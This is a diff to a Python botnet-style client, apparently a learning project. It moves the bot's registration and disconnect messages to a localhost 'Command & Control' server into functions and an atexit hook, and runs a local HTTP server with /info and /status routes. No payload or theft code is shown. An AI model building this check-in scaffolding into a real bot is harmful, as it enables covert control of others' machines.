@@ -1,14 +1,17 @@
+import atexit
+import contextlib
 import platform
 import requests
 import socket
 import json
+
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
 class Bot(BaseHTTPRequestHandler):
 
     def do_GET(self):
-        if self.path == '/info':  # TODO con platform
+        if self.path == '/info':
             self.GET_info()
         elif self.path == '/status':
             self.send_response(200)
@@ -40,22 +43,30 @@ CNC_ADDR = "127.0.0.1"
 CNC_PORT = 60000
 
 
+def start():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((CNC_ADDR, CNC_PORT))
+        s.send(b"n")
+
+
 def exit_handler():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((CNC_ADDR, CNC_PORT))
         s.send(b"c")
-        print("Connection closed")
 
 
 if __name__ == '__main__':
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((CNC_ADDR, CNC_PORT))
-        s.send(b"n")
-        print("Connected to the Command & Control")
 
     bot = HTTPServer(('127.0.0.1', 8080), Bot)
 
     try:
+        start()
+        print("Connected to the Command & Control")
+        atexit.register(exit_handler)
         bot.serve_forever()
-    except KeyboardInterrupt:
-        exit_handler()
+    except ConnectionRefusedError as e:
+        print("Cannot establish the connection to Command & Control")
+    except KeyboardInterrupt as e:
+        pass
+    finally:
+        print("Closing program...")
